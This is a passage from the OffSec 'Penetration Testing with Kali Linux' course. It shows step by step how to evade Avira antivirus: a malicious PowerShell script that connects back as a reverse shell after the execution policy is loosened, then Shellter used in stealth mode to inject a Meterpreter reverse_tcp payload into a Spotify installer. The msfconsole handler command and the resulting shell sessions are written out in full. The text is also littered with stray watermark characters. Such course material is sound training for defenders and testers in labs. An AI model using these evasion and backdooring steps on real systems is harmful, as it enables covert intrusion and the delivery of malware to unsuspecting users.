k
s
o
Figure 200: Avira scan on our malicious PowerShell script
n
Since the msfvenom payload is for x86, we are going to launch the x86 version of PowerShell,
named Windows PowerShell (x86), as depicted in the image below.
i
z
D
Figure 201: Launching x86 powershell version
Let’s run bypass.ps1 and analyze the output.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 369
Made in Morocco
Penetration Testing with Kali Linux
PS C:\Users\offsec\Desktop> .\bypass.ps1
.\bypass.ps1 : File C:\Users\offsec\Desktop\bypass.ps1 cannot be loaded because
running scripts is disabled on this
system. For more information, see about_Execution_Policies at
https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ .\bypass.ps1
+ ~~~~~~~~~~~~
+ CategoryInfo : SecurityError: (:) [], PSSecurityException
+ FullyQualifiedErrorId : UnauthorizedAccess
Listing 245 - Attempting to run the script and encountering the Execution Policies error
Unfortunately, when we attempt to run our malicious script, we are presented with an error that
references the Execution Policies of our system, which appear to prevent our script from running.
A quick review of the Microsoft documentation on PowerShell exeycution policies (linked in the
error message), shows that these policies are set on a per-user rather than per-system basis.
k
Keep in mind that much like anything in Windows, the PowerShell Execution
s
Policy settings can be dictated by one or more Active Directory GPOs.583 In those
cases, it may be necessary to search for additional bypass vectors.
o
Let’s attempt to view and change the policyn for our current user. Please note that in this instance,
we have chosen to change the policy globally rather than on a per-script basis, which can be
achieved by using the -ExecutionPolicy Bypass flag for each script when it is run.
i
First, we are going to retrieve thze current execution policy via the Get-ExecutionPolicy -Scope
CurrentUser command and then set it to Unrestricted via the Set-ExecutionPolicy -ExecutionPolicy
Unrestricted -Scope CurrentUser command.
D
PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Undefined
PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope
CurrentUser
Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing
the execution policy might expose
you to the security risks described in the about_Execution_Policies help Module at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution
policy?
[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is
"N"): A
PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Unrestricted
Listing 246 - Changing the ExecutionPolicy for our current user
583 (Microsoft, 2018), https://docs.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-objects
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 370
Made in Morocco
Penetration Testing with Kali Linux
The listing above shows that we have successfully changed the policy for our current user to
Unrestricted.
Before executing our script, we will start a Netcat listener on our Kali attacker machine to interact
with our shell.
kali@kali:~$ nc -lvnp 443
listening on [any] 443 ...
Listing 247 - Setting up a netcat listener to interact with our reverse shell
Now we will try to launch the PowerShell script:
PS C:\Users\offsec\Desktop> .\bypass.ps1
IsPublic IsSerial Name BaseType
-------- -------- ---- --y------
True True Byte[] System.Array
124059648
k
124059649
...
Listing 248 - Running the PowesrShell script
The script executes without any problems and we receive a reverse shell on our attack machine.
o
kali@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.50.1] from (UNKNOWNn) [192.168.50.62] 64613
Microsoft Windows [Version 10.0.22000.675]
(c) Microsoft Corporation. All rights reserved.
i
C:\Users\offsec>whoami z
whoami
client01\offsec
D
C:\Users\offsec>hostname
hostname
client01
Listing 249 - Receiving a reverse shell on our attacking machine
This means we have effectively evaded Avira detection on our target. In mature organizations,
various machine learning584 software can be implemented that will try to analyze the contents of
the scripts that are run on the system. Depending on the configuration of these systems and what
they consider harmful, scripts like the one above may need to be altered or adapted for the target
environment.
Additionally, when implemented correctly with a skilled operations center, EDR systems could just
silently alert the SOC team and thus, render our attack useless in a matter of minutes.
584 (Microsoft, 2109), https://www.microsoft.com/security/blog/2019/09/03/deep-learning-rises-new-methods-for-detecting-
malicious-powershell/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 371
Made in Morocco
Penetration Testing with Kali Linux
12.3.3 Automating the Process
Now that we have learned how to manually evade an AV via PowerShell, let’s explore how to
automate AV evasion payloads.
Shellter585 is a dynamic shellcode injection tool and one of the most popular free tools capable of
bypassing antivirus software. It uses a number of novel and advanced techniques to backdoor a
valid and non-malicious executable file with a malicious shellcode payload.
While the details of the techniques Shellter uses are beyond the scope of this Module, it
essentially performs a thorough analysis of the target PE file and the execution paths. It then
determines where it can inject our shellcode without relying on traditional injection techniques
that are easily caught by AV engines. Those include changing of PE file section permissions,
creating new sections, etc.
y
Finally, Shellter attempts to use the existing PE Import Address Table (IAT)586 entries to locate
functions that will be used for the memory allocation, transfer, and execution of our payload.
k
s
A Shellter Pro paid version that supports both 32 and 64-bit binaries, which
includes stealthier anti-AV features, is also available.
o
With a little bit of theory behind us, let’s attempt to bypass our current Avira antivirus software
n
using Shellter. We can install Shellter in Kali using the apt command.
kali@kali:~$ apt-cache search shiellter
shellter - Dynamic shellcode iznjection tool and dynamic PE infector
kali@kali:~$ sudo apt install shellter
... D
Listing 250 - Installing shellter in Kali Linux
Since Shellter is designed to be run on Windows operating systems, we will also install wine,587 a
compatibility layer capable of running win32 applications on several POSIX-compliant operating
systems.
kali@kali:~$ sudo apt install wine
...
root@kali:~# dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32
Listing 251 - Installing wine in Kali Linux
Once everything is installed, running the shellter command in the local Kali terminal will provide us
with a new console running under wine.
585 (Shellter, 2022), https://www.shellterproject.com
586 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Portable_Executable#Import_Table
587 (The Wine Project, 2022) https://www.winehq.org/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 372
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
Figure 202: Initial shellter console.
Shellter can run in either Auto or Manual mode. Ion Manual mode, the tool will launch the PE we
want to use for injection and allow us to manipulate it on a more granular level. We can use this
mode to highly customize the injection process in case the automatically selected options fail.
n
For the purposes of this example however, we will run Shellter in Auto mode by selecting A at the
prompt.
i
Next, we must select a target PEz. Shellter will analyze and alter the execution flow to inject and
execute our payload. For this example, we will use the Windows 32-bit trial executable installer for
the popular music player SpDotify588 as our target PE. At time of this writing, Spotify offers only the
32-bit Windows version of the installer.
For real engagements, it is best practice to pick a new, less scrutinized
application as Shellter’s author explains.589
To start, we’ll need to tell Shellter the Spotify installer location on our local Kali machine. In this
case, it is /home/kali/desktop/spotifysetup.exe. Before analyzing and altering the original PE in
any way, Shellter will first create a backup of the file.
588 (Spotify AB, 2022), https://www.spotify.com/us/download/windows/
589 (Shellter, 2022), https://www.shellterproject.com/an-important-tip-for-shellter-usage/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 373
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
n
Figure 203: Selecting a target PE in shellter and performing a backup
As soon as Shellter finds a suitable iplace to inject our payload, it will ask us if we want to enable
Stealth Mode,590 which will attemzpt to restore the execution flow of the PE after our payload has
been executed. Let’s enable Stealth Mode as we would like the Spotify installer to behave
normally in order to avoid aDny suspicion.
At this point, we are presented with the list of available payloads. These include popular
selections such as Meterpreter, but Shellter also supports custom payloads.
590 (Shellter, 2019), https://www.shellterproject.com/faq/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 374
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
n
Figure 204: List of payloads available in shellter
Note that in order to restore the iexecution flow through the Stealth Mode option, custom
payloads need to terminate by exizting the current thread.
After some testing, it seems that any non-Meterpreter payload fails to be executed correctly under
D
Windows 11 and thus, we’ll need to resort to Meterpreter-based payloads.
At this stage, we should not worry too much about the differences between standard and
Meterpreter payloads as we are going to learn about those in an upcoming Module.
In order to test Shellter’s bypass capabilities, we will use the Meterpreter version of the reverse
shell payload that Avira detected at the beginning of this Module. After submitting L for listed
payloads, we’ll select the first payload. We are then presented with the default options from
Metasploit, such as the reverse shell host (LHOST) and port (LPORT), which we should fill with our
local Kali’s IP address and listening port.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 375
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
Figure 205: Payload options in shellter
With all of the parameters set, Shellter will inject thoe payload into the Spotify installer and attempt
to reach the first instruction of the payload.
n
i
z
D
Figure 206: shellter verifying the injection
Now that the test has succeeded, before transferring over the malicious PE file to our Windows
client, we will configure a listener on our Kali machine to interact with the Meterpreter payload.
We can accomplish this with the following one-liner, remembering to replace the IP address with
the one on our Kali box.
kali@kali:~$ msfconsole -x "use exploit/multi/handler;set payload
windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 376
Made in Morocco
Penetration Testing with Kali Linux
...
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.50.1
LPORT => 443
[*] Started reverse TCP handler on 192.168.50.1:443
Listing 252 - Setting up a handler for the meterpreter payload
Next, we will transfer the backdoored Spotify installer over to the target Windows 11 client and
launch an Avira Quick Scan as we did previously.
y
k
s
o
n
i
z
D
Figure 207: Running a Quick Scan using Avira
Avira’s Quick Scan performs a check inside every user’s common folder, including the Desktop
folder.
Since Shellter obfuscates both the payload as well as the payload decoder before injecting them
into the PE, Avira’s signature-based scan runs cleanly. It does not consider the binary malicious.
Once we execute the file, we are presented with the default Spotify installation window, which
under normal circumstances will download the Spotify package over the internet. Because our
VM has no internet connection, the Spotify installer will hang indefinitely.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 377
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
n
i
z
Figure 208: Launching the backdoored Spotify installer
D
Reviewing our multi/handler window, it shows that we successfully received a Meterpreter shell.
...
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.50.1
LPORT => 443
[*] Started reverse TCP handler on 192.168.50.1:443
[*] Sending stage (175174 bytes) to 192.168.50.62
[*] Meterpreter session 1 opened (192.168.50.1:443 -> 192.168.50.62:52273)...
meterpreter > shell
Process 6832 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.739]
(c) Microsoft Corporation. All rights reserved.
C:\Users\offsec\Desktop>whoami
whoami
client01\offsec
Listing 253 - Receiving the meterpreter session
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 378
Made in Morocco
Penetration Testing with Kali Linux
We’ve launched an interactive Windows shell session and verified that we actually landed on the
target machine as the offsec user.
Awesome! We managed to evade antivirus detections by injecting a malicious payload into an
otherwise legitimate program. This foundational example can be even further expanded and
tailored on a case-by-case basis during real phishing engagements.